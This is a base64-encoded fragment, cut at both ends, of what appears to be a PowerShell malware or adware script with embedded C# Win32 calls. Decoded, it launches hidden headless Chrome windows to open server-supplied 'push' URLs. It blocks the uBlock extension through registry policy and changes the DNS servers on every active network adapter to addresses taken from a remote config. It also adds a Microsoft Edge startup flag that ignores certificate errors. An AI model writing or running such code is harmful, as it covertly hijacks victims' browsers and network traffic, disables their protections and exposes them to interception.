WaXNpYmxlRXgoSW50UHRyIGhXbmQpIHsNCiAgICAgICAgICAgIHJldHVybiBJc1dpbmRvd1Zpc2libGUoaFduZCkgJiYgR2V0V2luZG93VGV4dExlbmd0aChoV25kKSA+IDA7DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIEludFB0cltdIEVudW1lcmF0ZUFsbFdpbmRvd3MoKSB7DQogICAgICAgICAgICB2YXIgd2luZG93SGFuZGxlcyA9IG5ldyBMaXN0PEludFB0cj4oKTsNCiAgICAgICAgICAgIEVudW1XaW5kb3dzKChoV25kLCBsUGFyYW0pID0+IHsNCiAgICAgICAgICAgICAgICBpZiAoSXNXaW5kb3dWaXNpYmxlRXgoaFduZCkpIHsNCiAgICAgICAgICAgICAgICAgICAgd2luZG93SGFuZGxlcy5BZGQoaFduZCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgfSwgSW50UHRyLlplcm8pOw0KICAgICAgICAgICAgcmV0dXJuIHdpbmRvd0hhbmRsZXMuVG9BcnJheSgpOw0KICAgICAgICB9DQoNCiAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFNob3dXaW5kb3coSW50UHRyIGhXbmQsIGludCBuQ21kU2hvdyk7DQoNCiAgICAgICAgcHVibGljIGNvbnN0IGludCBTV19ISURFID0gMDsNCiAgICAgICAgcHVibGljIGNvbnN0IGludCBTV19NSU5JTUlaRSA9IDY7DQogICAgICAgIHB1YmxpYyBjb25zdCBpbnQgU1dfU0hPVyA9IDU7DQoNCiAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFBvc3RNZXNzYWdlKEludFB0ciBoV25kLCB1aW50IE1zZywgSW50UHRyIHdQYXJhbSwgSW50UHRyIGxQYXJhbSk7DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyB2b2lkIENsb3NlV2luZG93KEludFB0ciBoV25kKSB7DQogICAgICAgICAgICBjb25zdCB1aW50IFdNX0NMT1NFID0gMHgwMDEwOw0KICAgICAgICAgICAgUG9zdE1lc3NhZ2UoaFduZCwgV01fQ0xPU0UsIEludFB0ci5aZXJvLCBJbnRQdHIuWmVybyk7DQogICAgICAgIH0NCiAgICB9DQoiQA0KDQogICAgaWYgKEhhdmVUb1B1c2hlcykNCiAgICB7DQogICAgICAgIENsb3NlLUFsbENocm9tZXM7DQogICAgICAgIFJlbW92ZS1QdXNoZXM7DQogICAgICAgIEFkZC1QdXNoZXM7DQogICAgfQ0KDQp9DQpjYXRjaCB7DQogICAgd3JpdGVkYmcgIkFuIGVycm9yIG9jY3VycmVkIChDb25maWd1cmUgQ2hyb21lIFB1c2hlcyk6ICRfIg0KfQ0KfQ0KDQoNCg0KZnVuY3Rpb24gT3Blbi1DaHJvbWVXaXRoVXJsIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJHVybCwgJGlzRGVidWcNCiAgICApDQogICAgJGpvYiA9IFN0YXJ0LUpvYiAtU2NyaXB0QmxvY2sgew0KICAgICAgICAgICAgcGFyYW0gKCR1cmwsICRpc0RlYnVnKQ0KDQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgIA0KIA0KICAgICAgICAgICAgQWRkLVR5cGUgQCINCiAgICAgICAgICAgIHVzaW5nIFN5c3RlbTsNCiAgICAgICAgICAgIHVzaW5nIFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljOw0KICAgICAgICAgICAgdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KICAgICAgICAgICAgdXNpbmcgU3lzdGVtLlRleHQ7DQogICAgICAgICAgICANCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgY2xhc3MgVXNlcjMyWCB7DQogICAgICAgICAgICAgICAgcHVibGljIGRlbGVnYXRlIGJvb2wgRW51bVdpbmRvd3NQcm9jKEludFB0ciBoV25kLCBJbnRQdHIgbFBhcmFtKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBFbnVtV2luZG93cyhFbnVtV2luZG93c1Byb2MgbHBFbnVtRnVuYywgSW50UHRyIGxQYXJhbSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgICAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBHZXRXaW5kb3dUZXh0KEludFB0ciBoV25kLCBTdHJpbmdCdWlsZGVyIGxwU3RyaW5nLCBpbnQgbk1heENvdW50KTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gaW50IEdldFdpbmRvd1RleHRMZW5ndGgoSW50UHRyIGhXbmQpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICAgICAgICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIElzV2luZG93VmlzaWJsZShJbnRQdHIgaFduZCk7DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZXRXaW5kb3dUZXh0KEludFB0ciBoV25kKSB7DQogICAgICAgICAgICAgICAgICAgIGludCBsZW5ndGggPSBHZXRXaW5kb3dUZXh0TGVuZ3RoKGhXbmQpOw0KICAgICAgICAgICAgICAgICAgICBpZiAobGVuZ3RoID09IDApIHJldHVybiBTdHJpbmcuRW1wdHk7DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgU3RyaW5nQnVpbGRlciBzYiA9IG5ldyBTdHJpbmdCdWlsZGVyKGxlbmd0aCArIDEpOw0KICAgICAgICAgICAgICAgICAgICBHZXRXaW5kb3dUZXh0KGhXbmQsIHNiLCBzYi5DYXBhY2l0eSk7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBzYi5Ub1N0cmluZygpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgYm9vbCBJc1dpbmRvd1Zpc2libGVFeChJbnRQdHIgaFduZCkgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gSXNXaW5kb3dWaXNpYmxlKGhXbmQpICYmIEdldFdpbmRvd1RleHRMZW5ndGgoaFduZCkgPiAwOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgSW50UHRyW10gRW51bWVyYXRlQWxsV2luZG93cygpIHsNCiAgICAgICAgICAgICAgICAgICAgdmFyIHdpbmRvd0hhbmRsZXMgPSBuZXcgTGlzdDxJbnRQdHI+KCk7DQogICAgICAgICAgICAgICAgICAgIEVudW1XaW5kb3dzKChoV25kLCBsUGFyYW0pID0+IHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChJc1dpbmRvd1Zpc2libGVFeChoV25kKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvd0hhbmRsZXMuQWRkKGhXbmQpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICAgICAgICAgIH0sIEludFB0ci5aZXJvKTsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHdpbmRvd0hhbmRsZXMuVG9BcnJheSgpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFNob3dXaW5kb3coSW50UHRyIGhXbmQsIGludCBuQ21kU2hvdyk7DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBwdWJsaWMgY29uc3QgaW50IFNXX0hJREUgPSAwOw0KICAgICAgICAgICAgICAgIHB1YmxpYyBjb25zdCBpbnQgU1dfTUlOSU1JWkUgPSA2Ow0KICAgICAgICAgICAgICAgIHB1YmxpYyBjb25zdCBpbnQgU1dfU0hPVyA9IDU7DQogICAgICAgICAgICAgICAgcHVibGljIGNvbnN0IGludCBTV19NQVhJTUlaRSA9IDM7IC8vIEFkZGVkIGNvbnN0YW50IGZvciBtYXhpbWl6aW5nIHdpbmRvdw0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgUG9zdE1lc3NhZ2UoSW50UHRyIGhXbmQsIHVpbnQgTXNnLCBJbnRQdHIgd1BhcmFtLCBJbnRQdHIgbFBhcmFtKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBDbG9zZVdpbmRvdyhJbnRQdHIgaFduZCkgew0KICAgICAgICAgICAgICAgICAgICBjb25zdCB1aW50IFdNX0NMT1NFID0gMHgwMDEwOw0KICAgICAgICAgICAgICAgICAgICBQb3N0TWVzc2FnZShoV25kLCBXTV9DTE9TRSwgSW50UHRyLlplcm8sIEludFB0ci5aZXJvKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQoiQA0KfQ0KY2F0Y2ggew0KfQ0KICAgICAgICANCiAgICAgICAgZnVuY3Rpb24gQ2xvc2UtQ2hyb21lV2luZG93IHsNCiAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgcGFyYW0gKCR3aW5kb3cpDQogICAgICAgICAgICAgICAgW1VzZXIzMlhdOjpDbG9zZVdpbmRvdygkd2luZG93KSB8IE91dC1OdWxsDQogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyAxMDANCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoIHt9DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIGZ1bmN0aW9uIENsb3NlLUNocm9tZSB7DQogICAgICAgICAgICBwYXJhbSAoJHByb2Nlc3MpDQogICAgICAgICAgICBDbG9zZS1DaHJvbWVXaW5kb3cgLXdpbmRvdyAkcHJvY2Vzcy5NYWluV2luZG93SGFuZGxlDQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgICRwcm9jZXNzIHwgU3RvcC1Qcm9jZXNzIC1Gb3JjZQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2ggew0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgJGNocm9tZVBhdGhzID0gQCgNCiAgICAgICAgICAgICJDOlxQcm9ncmFtIEZpbGVzXEdvb2dsZVxDaHJvbWVcQXBwbGljYXRpb25cY2hyb21lLmV4ZSIsDQogICAgICAgICAgICAiQzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxHb29nbGVcQ2hyb21lXEFwcGxpY2F0aW9uXGNocm9tZS5leGUiLA0KICAgICAgICAgICAgIiRlbnY6TE9DQUxBUFBEQVRBXEdvb2dsZVxDaHJvbWVcQXBwbGljYXRpb25cY2hyb21lLmV4ZSIsDQogICAgICAgICAgICAiJGVudjpQcm9ncmFtRmlsZXNcR29vZ2xlXENocm9tZVxBcHBsaWNhdGlvblxjaHJvbWUuZXhlIiwNCiAgICAgICAgICAgICIkZW52OlByb2dyYW1GaWxlcyh4ODYpXEdvb2dsZVxDaHJvbWVcQXBwbGljYXRpb25cY2hyb21lLmV4ZSINCiAgICAgICAgKQ0KICAgICAgICAkcmVzb2x2ZWRQYXRocyA9IEAoKQ0KICAgICAgICBmb3JlYWNoICgkcGF0aCBpbiAkY2hyb21lUGF0aHMpIHsNCiAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgJHJlc29sdmVkUGF0aCA9IFJlc29sdmUtUGF0aCAtUGF0aCAkcGF0aCAtRXJyb3JBY3Rpb24gU3RvcA0KICAgICAgICAgICAgICAgIGlmICgkcmVzb2x2ZWRQYXRoIC1ub3RpbiAkcmVzb2x2ZWRQYXRocykgew0KICAgICAgICAgICAgICAgICAgICAkcmVzb2x2ZWRQYXRocyArPSAkcmVzb2x2ZWRQYXRoLlBhdGgNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IGNhdGNoIHsNCiAgICAgICAgICAgICAgICB3cml0ZWRiZyAiRXJyb3IgcmVzb2x2aW5nIHBhdGg6ICRfIg0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgICRyZXNvbHZlZFBhdGhzID0gJHJlc29sdmVkUGF0aHMgfCBTZWxlY3QtT2JqZWN0IC1VbmlxdWUNCiAgICAgICAgZm9yZWFjaCAoJHBhdGggaW4gJHJlc29sdmVkUGF0aHMpIHsNCiAgICAgICAgICAgIGlmIChUZXN0LVBhdGggLVBhdGggJHBhdGgpIHsNCiAgICAgICAgICAgICAgICB3cml0ZWRiZyAiRm91bmQgQ2hyb21lIGF0OiAkcGF0aCINCiAgICANCiAgICAgICAgICAgICAgICAkcHJvY2Vzc1N0YXJ0SW5mbyA9IE5ldy1PYmplY3QgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NTdGFydEluZm8NCiAgICAgICAgICAgICAgICAkcHJvY2Vzc1N0YXJ0SW5mby5GaWxlTmFtZSA9ICRwYXRoDQogICAgICAgICAgICAgICAgaWYgKC1ub3QgJGlzRGVidWcpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAkcHJvY2Vzc1N0YXJ0SW5mby5Bcmd1bWVudHMgPSAiLS1oZWFkbGVzcyI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICRwcm9jZXNzU3RhcnRJbmZvLkFyZ3VtZW50cyArPSAiIC0tZGlzYWJsZS1ncHUgLS1kdW1wLWRvbSAkdXJsIg0KICAgICAgICAgICAgICAgICRwcm9jZXNzU3RhcnRJbmZvLkNyZWF0ZU5vV2luZG93ID0gJGZhbHNlDQogICAgICAgICAgICAgICAgJHByb2Nlc3NTdGFydEluZm8uVXNlU2hlbGxFeGVjdXRlID0gJGZhbHNlDQogICAgICAgICAgICAgICAgJHByb2Nlc3MgPSBOZXctT2JqZWN0IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzDQogICAgICAgICAgICAgICAgJHByb2Nlc3MuU3RhcnRJbmZvID0gJHByb2Nlc3NTdGFydEluZm8NCiAgICAgICAgICAgICAgICAkcHJvY2Vzcy5TdGFydCgpIHwgT3V0LU51bGwgICAgICAgICANCiAgICAgICAgICAgICAgICAkZW5kVGltZSA9IChHZXQtRGF0ZSkuQWRkU2Vjb25kcyg4KQ0KICAgICAgICAgICAgICAgIHdoaWxlICgoR2V0LURhdGUpIC1sdCAkZW5kVGltZSkgew0KICAgICAgICAgICAgICAgICAgICBpZiAoJGlzRGVidWcgLWVxICRmYWxzZSkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgW1VzZXIzMlhdOjpTaG93V2luZG93KCRwcm9jZXNzLk1haW5XaW5kb3dIYW5kbGUsIFtVc2VyMzJYXTo6U1dfSElERSkgfCBPdXQtTnVsbCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgMTAwDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgW1VzZXIzMlhdOjpTaG93V2luZG93KCRwcm9jZXNzLk1haW5XaW5kb3dIYW5kbGUsIFtVc2VyMzJYXTo6U1dfU0hPVykgfCBPdXQtTnVsbA0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgQ2xvc2UtQ2hyb21lIC1wcm9jZXNzICRwcm9jZXNzDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgd3JpdGVkYmcgIkNocm9tZSBub3QgZm91bmQgYXQ6ICRwYXRoIg0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICB9IC1Bcmd1bWVudExpc3QgJHVybCwgJGlzRGVidWcNCg0KICAgIHJldHVybiAkam9iDQp9DQoNCmZ1bmN0aW9uIExhdW5jaENocm9tZVB1c2hlcyB7DQogICAgJGF1dG8gPSBUZXN0LUF1dG9zdGFydDsNCiAgICBpZiAoJHNlcnZlci5wdXNoZXNGb3JjZSAtbmUgJGZhbHNlIC1hbmQgJGF1dG8gLWVxICR0cnVlKQ0KICAgIHsNCiAgICAgICAgd3JpdGVkYmcgIlNraXBwaW5nIGZ1bmN0aW9uIExhdW5jaENocm9tZVB1c2hlcyINCiAgICAgICAgcmV0dXJuDQogICAgfQ0KICAgIHRyeSB7DQogICAgICAgIGZvcmVhY2ggKCRwdXNoIGluICRzZXJ2ZXIucHVzaGVzKSB7DQogICAgICAgICAgICAkaXNEZWJ1ZyA9IElzRGVidWcNCiAgICAgICAgICAgIE9wZW4tQ2hyb21lV2l0aFVybCAtdXJsICRwdXNoIC1pc0RlYnVnICRpc0RlYnVnDQogICAgICAgIH0NCiAgICB9DQogICAgY2F0Y2ggew0KICAgICAgd3JpdGVkYmcgIkFuIGVycm9yIG9jY3VycmVkIExhdW5jaENocm9tZVB1c2hlcyk6ICRfIg0KICAgIH0NCn0NCg0KZnVuY3Rpb24gZG9fY2hyb21lX3B1c2ggew0KICAgIENvbmZpZ3VyZUNocm9tZVB1c2hlcw0KICAgIExhdW5jaENocm9tZVB1c2hlcw0KfQ0KDQpmdW5jdGlvbiBkb19jaHJvbWVfdWJsb2NrIHsNCiAgICAka2V5d29yZHMgPSBAKCJ1QmxvY2siKQ0KDQogICAgZm9yZWFjaCAoJGRpciBpbiBHZXQtRW52UGF0aHMpIHsNCiAgICAgICAgJGNocm9tZURpciA9IEpvaW4tUGF0aCAtUGF0aCAkZGlyIC1DaGlsZFBhdGggIkdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcRXh0ZW5zaW9ucyINCiAgICAgICAgDQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBpZiAoVGVzdC1QYXRoIC1QYXRoICRjaHJvbWVEaXIgLVBhdGhUeXBlIENvbnRhaW5lcikgew0KICAgICAgICAgICAgICAgICRleHRlbnNpb25zID0gR2V0LUNoaWxkSXRlbSAtUGF0aCAkY2hyb21lRGlyIC1EaXJlY3RvcnkNCg0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRleHRlbnNpb24gaW4gJGV4dGVuc2lvbnMpIHsNCiAgICAgICAgICAgICAgICAgICAgJG1hbkZpbGUgPSBjaHJvbWV1YmxvY2tfRmluZE1hbmlmZXN0RmlsZSAtZm9sZGVyICRleHRlbnNpb24uRnVsbE5hbWUNCiAgICAgICAgICAgICAgICAgICAgaWYgKCRtYW5GaWxlIC1uZSAiIikgew0KICAgICAgICAgICAgICAgICAgICAgICAgJGZvdW5kS2V5d29yZCA9ICRmYWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoICgkbWFuaWZlc3RWYWx1ZSBpbiAka2V5d29yZHMpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkY29udGVudCA9IEdldC1Db250ZW50IC1QYXRoICRtYW5GaWxlIC1SYXcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGNvbnRlbnQgLW1hdGNoIFtyZWdleF06OkVzY2FwZSgkbWFuaWZlc3RWYWx1ZSkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGZvdW5kS2V5d29yZCA9ICR0cnVlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGZvdW5kS2V5d29yZCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRleHRGb2xkZXJOYW1lID0gW1N5c3RlbS5JTy5QYXRoXTo6R2V0RmlsZU5hbWUoJGV4dGVuc2lvbi5GdWxsTmFtZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWV1YmxvY2tfUHJvY2Vzc01hbmlmZXN0QWxsIC1leHROYW1lICRleHRGb2xkZXJOYW1lDQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0gY2F0Y2ggew0KICAgICAgICAgICAgIHdyaXRlZGJnICJFcnJvciBvY2N1cnJlZDogJF8iDQogICAgICAgIH0NCiAgICB9DQp9DQoNCg0KZnVuY3Rpb24gY2hyb21ldWJsb2NrX0ZpbmRNYW5pZmVzdEZpbGUgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kZm9sZGVyDQogICAgKQ0KDQogICAgJHJlc3VsdCA9ICIiDQoNCiAgICBHZXQtQ2hpbGRJdGVtIC1QYXRoICRmb2xkZXIgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgIGlmICgtbm90ICgkXy5QU0lzQ29udGFpbmVyKSkgew0KICAgICAgICAgICAgaWYgKCRfLk5hbWUgLWVxICJtYW5pZmVzdC5qc29uIikgew0KICAgICAgICAgICAgICAgICRyZXN1bHQgPSAkXy5GdWxsTmFtZQ0KICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGVsc2VpZiAoJF8uTmFtZSAtbm90aW4gQCgnLicsICcuLicpKSB7DQogICAgICAgICAgICAkcmVzdWx0ID0gY2hyb21ldWJsb2NrX0ZpbmRNYW5pZmVzdEZpbGUgLWZvbGRlciAkXy5GdWxsTmFtZQ0KICAgICAgICAgICAgaWYgKCRyZXN1bHQgLW5lICIiKSB7DQogICAgICAgICAgICAgICAgcmV0dXJuDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQoNCiAgICByZXR1cm4gJHJlc3VsdA0KfQ0KDQoNCmZ1bmN0aW9uIGNocm9tZXVibG9ja19Qcm9jZXNzTWFuaWZlc3RBbGwgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kZXh0TmFtZQ0KICAgICkNCg0KICAgIGNocm9tZXVibG9ja19Qcm9jZXNzTWFuaWZlc3QgLWV4dE5hbWUgJGV4dE5hbWUgLWJyb3dzZXIgIkdvb2dsZVxDaHJvbWUiDQp9DQoNCmZ1bmN0aW9uIGNocm9tZXVibG9ja19Qcm9jZXNzTWFuaWZlc3Qgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kZXh0TmFtZSwNCiAgICAgICAgW3N0cmluZ10kYnJvd3Nlcg0KICAgICkNCg0KICAgICRyZWdQYXRoID0gIkhLTE06XFNPRlRXQVJFXFBvbGljaWVzXCRicm93c2VyXEV4dGVuc2lvbkluc3RhbGxCbG9ja2xpc3QiDQogICAgDQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkcmVnUGF0aCkpIHsNCiAgICAgICAgTmV3LUl0ZW0gLVBhdGggJHJlZ1BhdGggLUZvcmNlIHwgT3V0LU51bGwNCiAgICB9DQogICAgDQogICAgJHJlZ0tleUluZGV4ID0gMQ0KICAgIGRvIHsNCiAgICAgICAgJGtleU5hbWUgPSAiJHJlZ0tleUluZGV4Ig0KICAgICAgICAkdmFsID0gR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcmVnUGF0aCAtTmFtZSAka2V5TmFtZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICBpZiAoJHZhbCAtZXEgJGV4dE5hbWUpIHsNCiAgICAgICAgICAgIHJldHVybg0KICAgICAgICB9DQogICAgICAgICRyZWdLZXlJbmRleCsrDQogICAgfSB1bnRpbCAoLW5vdCAoVGVzdC1QYXRoICIkcmVnUGF0aFwka2V5TmFtZSIpKQ0KDQogICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcmVnUGF0aCAtTmFtZSAka2V5TmFtZSAtVmFsdWUgJGV4dE5hbWUNCn0NCg0KZnVuY3Rpb24gU2V0LURuc1NlcnZlcnMgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kcHJpbWFyeURuc1NlcnZlciwNCiAgICAgICAgW3N0cmluZ10kc2Vjb25kYXJ5RG5zU2VydmVyDQogICAgKQ0KDQogICAgdHJ5IHsNCiAgICAgICAgIyBHZXQgbmV0d29yayBhZGFwdGVycyB0aGF0IGFyZSBJUC1lbmFibGVkDQogICAgICAgICRuZXR3b3JrQWRhcHRlcnMgPSBHZXQtTmV0QWRhcHRlciB8IFdoZXJlLU9iamVjdCB7ICRfLlN0YXR1cyAtZXEgJ1VwJyAtYW5kICRfLkludGVyZmFjZURlc2NyaXB0aW9uIC1ub3RsaWtlICcqVmlydHVhbConIH0NCg0KICAgICAgICBmb3JlYWNoICgkYWRhcHRlciBpbiAkbmV0d29ya0FkYXB0ZXJzKSB7DQogICAgICAgICAgICAjIFNldCBETlMgc2VydmVycyB1c2luZyBTZXQtRG5zQ2xpZW50U2VydmVyQWRkcmVzcyBjbWRsZXQNCiAgICAgICAgICAgIFNldC1EbnNDbGllbnRTZXJ2ZXJBZGRyZXNzIC1JbnRlcmZhY2VBbGlhcyAkYWRhcHRlci5OYW1lIC1TZXJ2ZXJBZGRyZXNzZXMgQCgkcHJpbWFyeURuc1NlcnZlciwgJHNlY29uZGFyeURuc1NlcnZlcikgLUNvbmZpcm06JGZhbHNlDQogICAgICAgICAgICANCiAgICAgICAgICAgIHdyaXRlZGJnICJTdWNjZXNzZnVsbHkgc2V0IEROUyBzZXJ2ZXJzIGZvciBhZGFwdGVyOiAkKCRhZGFwdGVyLkludGVyZmFjZURlc2NyaXB0aW9uKSINCiAgICAgICAgfQ0KICAgIH0gY2F0Y2ggew0KICAgICAgICB3cml0ZWRiZyAiQW4gZXJyb3Igb2NjdXJyZWQ6ICRfIg0KICAgIH0NCn0NCg0KZnVuY3Rpb24gZG9fZG5zbWFuIHsNCiAgICBTZXQtRE5TU2VydmVycyAtUHJpbWFyeUROU1NlcnZlciAkc2VydmVyLnByaW1hcnlEbnMgLVNlY29uZGFyeUROU1NlcnZlciAkc2VydmVyLnNlY29uZGFyeURucw0KfQ0KDQpmdW5jdGlvbiBkb19lZGdlIHsNCiAgICAkcGF0aHMgPSBAKA0KICAgICAgICAiSEtMTTpcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XEVkZ2UiLA0KICAgICAgICAiSEtDVTpcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XEVkZ2UiDQogICAgKQ0KDQogICAgZm9yZWFjaCAoJGVkZ2VLZXlQYXRoIGluICRwYXRocykgDQogICAgew0KICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRlZGdlS2V5UGF0aCkpIHsNCiAgICAgICAgICAgIE5ldy1JdGVtIC1QYXRoICRlZGdlS2V5UGF0aCAtRm9yY2UgfCBPdXQtTnVsbA0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICAkY29tbWFuZExpbmVQYXRoID0gSm9pbi1QYXRoICRlZGdlS2V5UGF0aCAiQ29tbWFuZExpbmUiDQogICAgICAgIGlmICgtbm90IChUZXN0LVBhdGggJGNvbW1hbmRMaW5lUGF0aCkpIHsNCiAgICAgICAgICAgIE5ldy1JdGVtIC1QYXRoICRjb21tYW5kTGluZVBhdGggLUZvcmNlIHwgT3V0LU51bGwNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkY29tbWFuZExpbmVQYXRoIC1OYW1lICIoRGVmYXVsdCkiIC1WYWx1ZSAiLS1pZ25vcmUtY2VydGlmaWNhdGUtZXJyb3JzIC0tZGlzYWJsZS1xdWl